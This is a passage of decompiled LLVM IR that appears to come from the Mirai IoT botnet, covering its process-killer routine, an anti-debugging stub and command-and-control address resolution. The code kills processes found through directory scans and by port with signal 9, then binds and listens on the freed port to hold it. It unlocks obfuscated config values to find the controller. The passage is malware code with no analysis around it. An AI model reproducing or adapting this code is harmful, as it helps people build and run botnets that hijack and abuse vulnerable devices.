  %v1_e2b8 = load i32, i32* @sl, align 4
  %v2_e2b8 = add i32 %v1_e2b8, %v2_e2b0
  store i32 %v2_e2b8, i32* @r0, align 4
  %v2_e2bc = inttoptr i32 %v2_e2b8 to i8*
  %v3_e2bc = call i32 @util_strcpy(i8* %v2_e2bc, i32 %v0_e2b4)
  %v2_e2c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2c8 = load i32, i32* @r5, align 4
  store i32 %v2_e2c4, i32* @r4, align 4
  %v2_e2d4 = inttoptr i32 %v0_e2c8 to i32*
  %v3_e2d4 = call i32 @table_retrieve_val(i32 8, i32* %v2_e2d4)
  %v0_e2dc = load i32, i32* @r4, align 4
  %v1_e2dc = load i32, i32* @sl, align 4
  %v2_e2dc = add i32 %v1_e2dc, %v0_e2dc
  store i32 %v2_e2dc, i32* @r0, align 4
  %v2_e2e0 = inttoptr i32 %v2_e2dc to i8*
  %v3_e2e0 = call i32 @util_strcpy(i8* %v2_e2e0, i32 %v3_e2d4)
  %v2_e2e8 = call i32 @util_strlen(i8* %v3_df30)
  %v1_e2f0 = load i32, i32* @sl, align 4
  %v2_e2f0 = add i32 %v1_e2f0, %v2_e2e8
  store i32 %v2_e2f0, i32* @r0, align 4
  %v2_e2f4 = inttoptr i32 %v2_e2f0 to i8*
  %v3_e2f4 = call i32 @util_strcpy(i8* %v2_e2f4, i32 ptrtoint (i32* @global_var_1a77c.31 to i32))
  %v2_e2fc = call i32 @util_strlen(i8* %v3_df30)
  %v0_e300 = load i32, i32* @r6, align 4
  %v1_e300 = add i32 %v0_e300, 11
  %v1_e304 = load i32, i32* @sl, align 4
  %v2_e304 = add i32 %v1_e304, %v2_e2fc
  store i32 %v2_e304, i32* @r0, align 4
  %v2_e308 = inttoptr i32 %v2_e304 to i8*
  %v3_e308 = call i32 @util_strcpy(i8* %v2_e308, i32 %v1_e300)
  %v3_e318 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e31c = icmp eq i32 %v3_e318, -1
  br i1 %v7_e31c, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e290
  %v2_e328 = call i32 @util_strlen(i8* %v3_df1c)
  store i32 %v2_e328, i32* @r1, align 4
  %v4_e33c = call i32 @util_stristr(i8* %v3_df1c, i32 %v2_e328, i32 %v2_e148.pre-phi)
  %v7_e340 = icmp eq i32 %v4_e33c, -1
  br i1 %v7_e340, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e328
  %v0_e348 = load i32, i32* @r7, align 4
  %v2_e350 = inttoptr i32 %v0_e348 to i8*
  %v3_e350 = call i32 @util_atoi(i8* %v2_e350, i32 10)
  %v2_e358 = call i32 @kill(i32 %v3_e350, i32 9)
  %v0_e35c = load i32, i32* @r8, align 4
  %v1_e360 = inttoptr i32 %v0_e35c to i32*
  %v2_e360 = call i32 @__GI_readdir(i32* %v1_e360)
  store i32 %v2_e360, i32* @r6, align 4
  %v2_e364 = icmp eq i32 %v2_e360, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e364, label %dec_label_pc_e378, label %dec_label_pc_e288

dec_label_pc_e378:                                ; preds = %dec_label_pc_e270.loopexit, %dec_label_pc_e350, %dec_label_pc_e288, %dec_label_pc_e270.preheader
  %v0_e378 = load i32, i32* @r8, align 4
  %v1_e37c = inttoptr i32 %v0_e378 to i32*
  %v2_e37c = call i32 @__GI_closedir(i32* %v1_e37c)
  %v0_e380 = load i32, i32* @sb, align 4
  %v1_e384 = inttoptr i32 %v0_e380 to i32*
  %v2_e384 = call i32 @__GI_readdir(i32* %v1_e384)
  %v2_e388 = icmp eq i32 %v2_e384, 0
  br i1 %v2_e388, label %dec_label_pc_e390, label %dec_label_pc_e18c

dec_label_pc_e390:                                ; preds = %dec_label_pc_e17c.loopexit, %dec_label_pc_e378, %dec_label_pc_e18c, %dec_label_pc_e17c.preheader
  %v0_e390 = load i32, i32* @sb, align 4
  %v1_e394 = inttoptr i32 %v0_e390 to i32*
  %v2_e394 = call i32 @__GI_closedir(i32* %v1_e394)
  %v0_e398 = load i32, i32* @r5, align 4
  %v1_e398 = urem i32 %v0_e398, 256
  br label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e390
  %storemerge = phi i32 [ %v1_e398, %dec_label_pc_e390 ], [ 0, %dec_label_pc_e15c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e3a0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e13c, %dec_label_pc_e39c
  %v1_e3a8 = call i32 @table_lock_val(i32 6)
  %v1_e3b0 = call i32 @table_lock_val(i32 7)
  %v1_e3b8 = call i32 @table_lock_val(i32 8)
  %v1_e3c0 = call i32 @table_lock_val(i32 9)
  %v0_e3c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_e3c4:                                ; preds = %bb, %dec_label_pc_e3a8
  %v0_e3c4 = phi i32 [ %v1_df9c, %bb ], [ %v0_e3c4.pre, %dec_label_pc_e3a8 ]
  store i32 %v3_deb4, i32* @r4, align 4
  store i32 %v6_deb4, i32* @r5, align 4
  store i32 %v9_deb4, i32* @r6, align 4
  store i32 %v12_deb4, i32* @r7, align 4
  store i32 %v15_deb4, i32* @r8, align 4
  store i32 %v18_deb4, i32* @sb, align 4
  store i32 %v21_deb4, i32* @sl, align 4
  store i32 %v24_deb4, i32* @fp, align 4
  store i32 %v27_deb4, i32* @lr, align 4
  ret i32 %v0_e3c4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e0ac
  %v1_e3d8 = add i32 %v0_e3d8, 1
  %v7_e3dc = icmp eq i32 %v0_e3d8, 0
  br i1 %v7_e3dc, label %dec_label_pc_e3e4, label %dec_label_pc_e0b4

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3d8
  %v1_e3e4 = add i32 %v0_e0bc, 3
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i8*
  %v3_e3e4 = load i8, i8* %v2_e3e4, align 1
  %v7_e3e8 = icmp eq i8 %v3_e3e4, 65
  br i1 %v7_e3e8, label %dec_label_pc_e3fc, label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3e4, %dec_label_pc_e3fc
  %v0_e0c483 = phi i32 [ %v0_e0c484, %dec_label_pc_e3e4 ], [ 1, %dec_label_pc_e3fc ]
  br label %dec_label_pc_e08c.backedge

dec_label_pc_e08c.backedge:                       ; preds = %dec_label_pc_e3f0, %dec_label_pc_e0b8
  %v0_e0c482 = phi i32 [ %v0_e0c483, %dec_label_pc_e3f0 ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v0_e3d874 = phi i32 [ %v1_e3d8, %dec_label_pc_e3f0 ], [ %v0_e0b8, %dec_label_pc_e0b8 ]
  %v0_e0ac.pr71 = phi i32 [ 0, %dec_label_pc_e3f0 ], [ %v0_e0ac.pr72, %dec_label_pc_e0b8 ]
  %v0_e08c = add i32 %v0_e0bc, 1
  %v1_e08c = add i32 %v0_e0bc, 3
  %v2_e08c = inttoptr i32 %v1_e08c to i8*
  %v3_e08c = load i8, i8* %v2_e08c, align 1
  %v4_e08c = zext i8 %v3_e08c to i32
  store i32 %v4_e08c, i32* @r3, align 4
  %v2_e090 = icmp eq i8 %v3_e08c, 0
  %v1_e094 = add i32 %v0_e09479, 1
  br i1 %v2_e090, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3e4
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e404:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_df60

; uselistorder directives
  uselistorder i32 %v1_e094, { 1, 0 }
  uselistorder i32 %v4_e08c, { 1, 0 }
  uselistorder i32 %v0_e0c482, { 1, 0 }
  uselistorder i32 %v1_e3d8, { 1, 0 }
  uselistorder i32 %v2_e384, { 1, 0 }
  uselistorder i32 %v1_e0f0, { 1, 0 }
  uselistorder i32 %v0_e0fc30, { 1, 0 }
  uselistorder i32 %v1_e114, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e0b8, { 1, 0 }
  uselistorder i32 %v0_e09479, { 1, 0 }
  uselistorder i32 %v0_e3d8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e0c484, { 1, 2, 0 }
  uselistorder i32 %v1_e09455, { 1, 0 }
  uselistorder i32 %v2_e078, { 1, 0 }
  uselistorder i32 %v1_e074, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_e034, { 0, 2, 1 }
  uselistorder i32 %v0_e03416, { 1, 0 }
  uselistorder i32 %v1_e000, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_df90, { 1, 2, 0 }
  uselistorder i32 %v0_df38, { 1, 0 }
  uselistorder i32 %v2_df34, { 1, 0, 2 }
  uselistorder i8* %v3_df1c, { 1, 0, 2 }
  uselistorder i32 %v2_defc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e3c4, { 1, 0 }
  uselistorder label %dec_label_pc_e3a8, { 1, 0 }
  uselistorder label %dec_label_pc_e39c, { 1, 0 }
  uselistorder label %dec_label_pc_e390, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e378, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e288, { 1, 0 }
  uselistorder label %dec_label_pc_e288thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e270.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e18c, { 1, 0 }
  uselistorder label %dec_label_pc_e18c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e17c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e110, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e09c, { 1, 0 }
  uselistorder label %dec_label_pc_e040, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_dfa4.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dff4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_df60, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v3_e430 = load i32, i32* @r4, align 4
  %v6_e430 = load i32, i32* @r5, align 4
  %v9_e430 = load i32, i32* @r6, align 4
  %v12_e430 = load i32, i32* @r7, align 4
  %v15_e430 = load i32, i32* @r8, align 4
  %v18_e430 = load i32, i32* @sb, align 4
  %v21_e430 = load i32, i32* @sl, align 4
  %v24_e430 = load i32, i32* @fp, align 4
  %v2_e43c = call i32 @__GI_time(i32* null)
  store i32 %v2_e43c, i32* @r5, align 4
  %v0_e444 = call i32 @__libc_fork()
  %v7_e448 = icmp eq i32 %v0_e444, -1
  %. = zext i1 %v7_e448 to i32
  %tmp69 = icmp slt i32 %v0_e444, 1
  %storemerge50 = select i1 %tmp69, i32 %., i32 1
  store i32 %storemerge50, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2359c.103 to i32), i32* %r3.global-to-local, align 4
  %v2_e464 = icmp eq i32 %storemerge50, 0
  store i32 %v0_e444, i32* @global_var_2359c.103, align 4
  br i1 %v2_e464, label %dec_label_pc_e47c, label %dec_label_pc_e470

dec_label_pc_e470:                                ; preds = %dec_label_pc_e4cc, %entry
  %v1_e478 = phi i32 [ %v0_e444, %entry ], [ 0, %dec_label_pc_e4cc ]
  store i32 %v3_e430, i32* @r4, align 4
  store i32 %v6_e430, i32* @r5, align 4
  store i32 %v9_e430, i32* @r6, align 4
  store i32 %v12_e430, i32* @r7, align 4
  store i32 %v15_e430, i32* @r8, align 4
  store i32 %v18_e430, i32* @sb, align 4
  store i32 %v21_e430, i32* @sl, align 4
  store i32 %v24_e430, i32* @fp, align 4
  ret i32 %v1_e478

dec_label_pc_e47c:                                ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v1_e490 = call i32 @killer_kill_by_port(i32 20736)
  %v2_e494 = icmp eq i32 %v1_e490, 0
  br i1 %v2_e494, label %dec_label_pc_e49c, label %dec_label_pc_e6f8

dec_label_pc_e49c:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e6f8, %dec_label_pc_e720
  %v1_e4a0 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e4a8 = call i32 @malloc()
  %v1_e4a8 = inttoptr i32 %v0_e4a8 to i8*
  store i32 %v0_e4a8, i32* @global_var_260bc.107, align 4
  store i32 ptrtoint (i32* @global_var_235a0.109 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e4a8, align 1
  %v0_e4c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e4c0 = inttoptr i32 %v1_e4c0 to i32*
  store i32 %v0_e4c0, i32* %v2_e4c0, align 4
  %v0_e4c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e4c4, i32* @fp, align 4
  store i32 400, i32* @r6, align 4
  %v2_e5c0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_e5cc = bitcast i32* %stack_var_-120 to i8*
  %v2_e62c = ptrtoint i32* %stack_var_-632 to i32
  br label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e49c
  %v1_e4d0 = call i32 @table_unlock_val(i32 6)
  %v3_e4dc = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e4e0 = call i32 @__GI_opendir(i32 %v3_e4dc)
  store i32 %v1_e4e0, i32* @sl, align 4
  %v2_e4e4 = icmp eq i32 %v1_e4e0, 0
  br i1 %v2_e4e4, label %dec_label_pc_e470, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4cc
  %v1_e4f0 = call i32 @table_lock_val(i32 6)
  %v0_e4f431 = load i32, i32* @sl, align 4
  %v1_e4f832 = inttoptr i32 %v0_e4f431 to i32*
  %v2_e4f833 = call i32 @__GI_readdir(i32* %v1_e4f832)
  %v2_e4fc35 = icmp eq i32 %v2_e4f833, 0
  br i1 %v2_e4fc35, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e504.preheader:                      ; preds = %dec_label_pc_e4ec, %dec_label_pc_e4f4.backedge
  %v0_e50440 = phi i32 [ %v2_e4f8, %dec_label_pc_e4f4.backedge ], [ %v2_e4f833, %dec_label_pc_e4ec ]
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e504.preheader, %dec_label_pc_e574
  %v0_e514 = phi i32 [ %v0_e50440, %dec_label_pc_e504.preheader ], [ %v2_e580, %dec_label_pc_e574 ]
  %v1_e504 = add i32 %v0_e514, 11
  %v2_e504 = inttoptr i32 %v1_e504 to i8*
  %v3_e504 = load i8, i8* %v2_e504, align 1
  %v4_e504 = zext i8 %v3_e504 to i32
  %v1_e508 = add nsw i32 %v4_e504, -48
  store i32 %v1_e508, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e508, 9
  br i1 %tmp, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %dec_label_pc_e504
  store i32 %v1_e504, i32* @r4, align 4
  %v3_e520 = call i32 @util_atoi(i8* %v2_e504, i32 10)
  %v0_e524 = load i32, i32* @r6, align 4
  store i32 %v3_e520, i32* @r8, align 4
  %v0_e52c = load i32, i32* @fp, align 4
  %v1_e52c = add i32 %v0_e52c, 1
  store i32 %v1_e52c, i32* @fp, align 4
  %v5_e530 = icmp slt i32 %v0_e524, %v3_e520
  %v2_e59c = call i32 @__GI_time(i32* null)
  br i1 %v5_e530, label %dec_label_pc_e598, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e514
  %v0_e53c = load i32, i32* @r5, align 4
  %v2_e53c = sub i32 %v2_e59c, %v0_e53c
  %v7_e544 = icmp slt i32 %v2_e53c, 601
  br i1 %v7_e544, label %dec_label_pc_e54c, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e534
  store i32 400, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e534
  %v0_e54c = load i32, i32* @r8, align 4
  %v7_e550 = icmp slt i32 %v0_e54c, 401
  br i1 %v7_e550, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e54c
  %v2_e558 = load i32, i32* @fp, align 4
  %v3_e558 = zext i32 %v2_e558 to i64
  %v4_e558 = mul nuw i64 %v3_e558, 3435973837
  %v3_e55c1 = udiv i64 %v4_e558, 34359738368
  %v3_e5603 = mul nuw nsw i64 %v3_e55c1, 8
  %v3_e560 = trunc i64 %v3_e5603 to i32
  store i32 %v3_e560, i32* %r3.global-to-local, align 4
  %v2_e5645 = mul nuw nsw i64 %v3_e55c1, 2
  %v2_e564 = trunc i64 %v2_e5645 to i32
  %v2_e568 = add i32 %v3_e560, %v2_e564
  store i32 %v2_e568, i32* %r2.global-to-local, align 4
  %v9_e56c = icmp eq i32 %v2_e558, %v2_e568
  br i1 %v9_e56c, label %dec_label_pc_e574, label %dec_label_pc_e4f4.backedge

dec_label_pc_e574:                                ; preds = %dec_label_pc_e554
  %v1_e578 = call i32 @sleep(i32 1)
  %v0_e57c = load i32, i32* @sl, align 4
  %v1_e580 = inttoptr i32 %v0_e57c to i32*
  %v2_e580 = call i32 @__GI_readdir(i32* %v1_e580)
  %v2_e584 = icmp eq i32 %v2_e580, 0
  br i1 %v2_e584, label %dec_label_pc_e58c, label %dec_label_pc_e504

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e4f4.backedge, %dec_label_pc_e574, %dec_label_pc_e4ec
  %v0_e58c = load i32, i32* @sl, align 4
  %v1_e590 = inttoptr i32 %v0_e58c to i32*
  %v2_e590 = call i32 @__GI_closedir(i32* %v1_e590)
  br label %dec_label_pc_e4cc

dec_label_pc_e598:                                ; preds = %dec_label_pc_e514
  %v1_e5a8 = call i32 @table_unlock_val(i32 6)
  %v1_e5b0 = call i32 @table_unlock_val(i32 10)
  %v3_e5bc = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_e5c0, i32* @sb, align 4
  store i32 %v2_e5c0, i32* @r0, align 4
  %v3_e5cc = call i32 @util_strcpy(i8* %v2_e5cc, i32 %v3_e5bc)
  %v1_e5d0 = load i32, i32* @sb, align 4
  %v2_e5d0 = add i32 %v1_e5d0, %v3_e5cc
  store i32 %v2_e5d0, i32* @r5, align 4
  %v0_e5d4 = load i32, i32* @r4, align 4
  store i32 %v2_e5d0, i32* @r0, align 4
  %v2_e5dc = inttoptr i32 %v2_e5d0 to i8*
  %v3_e5dc = call i32 @util_strcpy(i8* %v2_e5dc, i32 %v0_e5d4)
  store i32 %v3_e5dc, i32* @r4, align 4
  %v3_e5ec = call i32 @table_retrieve_val(i32 10, i32* null)
  %v0_e5f4 = load i32, i32* @r4, align 4
  %v1_e5f4 = load i32, i32* @r5, align 4
  %v2_e5f4 = add i32 %v1_e5f4, %v0_e5f4
  store i32 %v2_e5f4, i32* @r0, align 4
  %v2_e5f8 = inttoptr i32 %v2_e5f4 to i8*
  %v3_e5f8 = call i32 @util_strcpy(i8* %v2_e5f8, i32 %v3_e5ec)
  %v1_e600 = call i32 @table_lock_val(i32 6)
  %v1_e608 = call i32 @table_lock_val(i32 10)
  %v2_e614 = call i32 @__libc_open(i32 %v2_e5c0, i32 0)
  %v7_e618 = icmp eq i32 %v2_e614, -1
  store i32 %v2_e614, i32* @r7, align 4
  br i1 %v7_e618, label %dec_label_pc_e6c4, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e598
  %v1_e628 = call i32 @table_unlock_val(i32 62)
  store i32 %v2_e62c, i32* @r6, align 4
  %v0_e63027 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c28 = call i32 @__libc_read(i32 %v0_e63027)
  store i32 %v1_e63c28, i32* @r4, align 4
  %tmp72 = icmp slt i32 %v1_e63c28, 1
  br i1 %tmp72, label %dec_label_pc_e6e4, label %dec_label_pc_e648

dec_label_pc_e648:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e630.backedge
  %v3_e650 = call i32 @table_retrieve_val(i32 62, i32* null)
  store i32 %v3_e650, i32* @r5, align 4
  %v3_e660 = call i32 @table_retrieve_val(i32 62, i32* null)
  %v1_e664 = inttoptr i32 %v3_e660 to i8*
  %v2_e664 = call i32 @util_strlen(i8* %v1_e664)
  %v0_e668 = load i32, i32* @r4, align 4
  %v5_e66c = icmp slt i32 %v0_e668, %v2_e664
  br i1 %v5_e66c, label %dec_label_pc_e630.backedge, label %.thread12

dec_label_pc_e630.backedge:                       ; preds = %dec_label_pc_e694, %.thread12, %dec_label_pc_e648
  %v0_e630 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c = call i32 @__libc_read(i32 %v0_e630)
  store i32 %v1_e63c, i32* @r4, align 4
  %tmp73 = icmp slt i32 %v1_e63c, 1
  br i1 %tmp73, label %dec_label_pc_e6e4, label %dec_label_pc_e648

.thread12:                                        ; preds = %dec_label_pc_e648
  %v1_e67819 = add i32 %v0_e668, -1
  store i32 %v1_e67819, i32* @r4, align 4
  %v2_e67820 = icmp eq i32 %v0_e668, 0
  br i1 %v2_e67820, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680.lr.ph

dec_label_pc_e680.lr.ph:                          ; preds = %.thread12
  %v0_e680.pre = load i32, i32* @r5, align 4
  %v1_e684.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e694, %dec_label_pc_e680.lr.ph
  %v0_e678 = phi i32 [ %v1_e67819, %dec_label_pc_e680.lr.ph ], [ %v1_e678, %dec_label_pc_e694 ]
  %v0_e694 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e694, %dec_label_pc_e694 ]
  %v1_e680 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e68043, %dec_label_pc_e694 ]
  %v2_e680 = add i32 %v1_e680, %v0_e680.pre
  %v3_e680 = inttoptr i32 %v2_e680 to i8*
  %v4_e680 = load i8, i8* %v3_e680, align 1
  %v6_e680 = zext i8 %v4_e680 to i32
  store i32 %v6_e680, i32* %r2.global-to-local, align 4
  %v2_e684 = add i32 %v0_e694, %v1_e684.pre
  %v3_e684 = inttoptr i32 %v2_e684 to i8*
  %v4_e684 = load i8, i8* %v3_e684, align 1
  %v6_e684 = zext i8 %v4_e684 to i32
  store i32 %v6_e684, i32* @r3, align 4
  %v9_e688 = icmp eq i8 %v4_e684, %v4_e680
  br i1 %v9_e688, label %dec_label_pc_e69c, label %bb74

bb74:                                             ; preds = %dec_label_pc_e680
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %bb74, %dec_label_pc_e69c
  %v1_e68043 = phi i32 [ %v1_e69c, %dec_label_pc_e69c ], [ 0, %bb74 ]
  %v1_e694 = add i32 %v0_e694, 1
  %v1_e678 = add i32 %v0_e678, -1
  store i32 %v1_e678, i32* @r4, align 4
  %v2_e678 = icmp eq i32 %v0_e678, 0
  br i1 %v2_e678, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e680
  %v1_e69c = add i32 %v1_e680, 1
  %v9_e6a0 = icmp eq i32 %v2_e664, %v1_e69c
  br i1 %v9_e6a0, label %dec_label_pc_e6a8, label %dec_label_pc_e694

dec_label_pc_e6a8:                                ; preds = %dec_label_pc_e69c
  %v1_e6ac = call i32 @table_lock_val(i32 62)
  %v0_e6b0 = load i32, i32* @r7, align 4
  %v1_e6b4 = call i32 @__GI___libc_close(i32 %v0_e6b0)
  %v0_e6b8 = load i32, i32* @r8, align 4
  %v2_e6c0 = call i32 @kill(i32 %v0_e6b8, i32 9)
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e598, %dec_label_pc_e6e4, %dec_label_pc_e6a8
  %v2_e6cc = call i32 @util_zero(i32 %v2_e5c0, i32 64)
  %v1_e6d4 = call i32 @sleep(i32 1)
  store i32 %v2_e59c, i32* @r5, align 4
  %v0_e6dc = load i32, i32* @r8, align 4
  store i32 %v0_e6dc, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e4f4.backedge:                       ; preds = %dec_label_pc_e554, %dec_label_pc_e54c, %dec_label_pc_e504, %dec_label_pc_e6c4, %.thread7
  %v0_e4f4 = load i32, i32* @sl, align 4
  %v1_e4f8 = inttoptr i32 %v0_e4f4 to i32*
  %v2_e4f8 = call i32 @__GI_readdir(i32* %v1_e4f8)
  %v2_e4fc = icmp eq i32 %v2_e4f8, 0
  br i1 %v2_e4fc, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e630.backedge, %dec_label_pc_e624
  %v1_e6e8 = call i32 @table_lock_val(i32 62)
  %v0_e6ec = load i32, i32* @r7, align 4
  %v1_e6f0 = call i32 @__GI___libc_close(i32 %v0_e6ec)
  br label %dec_label_pc_e6c4

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e47c
  %v2_e480 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_e480, i32* %r3.global-to-local, align 4
  %v0_e700 = load i32, i32* @r4, align 4
  store i32 %v0_e700, i32* %r2.global-to-local, align 4
  %v3_e710 = call i32 @socket(i32 2, i32 1, i32 %v0_e700)
  %v7_e714 = icmp eq i32 %v3_e710, -1
  store i32 %v3_e710, i32* @r4, align 4
  br i1 %v7_e714, label %dec_label_pc_e49c, label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e6f8
  %v2_e720 = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e728 = call i32 @bind(i32 %v3_e710, i32 %v2_e720, i32 16)
  %v0_e72c = load i32, i32* @r4, align 4
  %v2_e734 = call i32 @listen(i32 %v0_e72c, i32 1)
  br label %dec_label_pc_e49c

; uselistorder directives
  uselistorder i32 %v3_e710, { 2, 1, 0 }
  uselistorder i32 %v2_e4f8, { 1, 0 }
  uselistorder i32 %v1_e69c, { 1, 0 }
  uselistorder i32 %v1_e678, { 1, 0 }
  uselistorder i32 %v1_e680, { 1, 0 }
  uselistorder i32 %v0_e694, { 1, 0 }
  uselistorder i32 %v0_e678, { 1, 0 }
  uselistorder i32 %v0_e668, { 1, 0, 2 }
  uselistorder i32 %v2_e664, { 1, 0 }
  uselistorder i32 %v2_e614, { 1, 0 }
  uselistorder i32 %v2_e580, { 1, 0 }
  uselistorder i32 %v2_e62c, { 1, 0, 2 }
  uselistorder i32 %storemerge50, { 1, 0 }
  uselistorder i32 %v0_e444, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32* @global_var_2359c.103, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e4f4.backedge, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_e6c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e694, { 1, 0 }
  uselistorder label %dec_label_pc_e648, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0 }
  uselistorder label %dec_label_pc_e504.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e49c, { 2, 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_e764.112 to i32), i32* @global_var_23428.114, align 4
  ret i32 %arg1
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_e76c = call i32 @table_unlock_val(i32 2)
  store i32 ptrtoint (i16** @global_var_260c0.116 to i32), i32* @r4, align 4
  store i32 2032805430, i32* @global_var_260c4.118, align 4
  %v3_e784 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v4_e784 = inttoptr i32 %v3_e784 to i16*
  %v3_e788 = load i16, i16* %v4_e784, align 2
  store i16 %v3_e788, i16* bitcast (i32* @global_var_260c2.119 to i16*), align 4
  %v1_e794 = call i32 @table_lock_val(i32 2)
  ret i32 %v1_e794
}

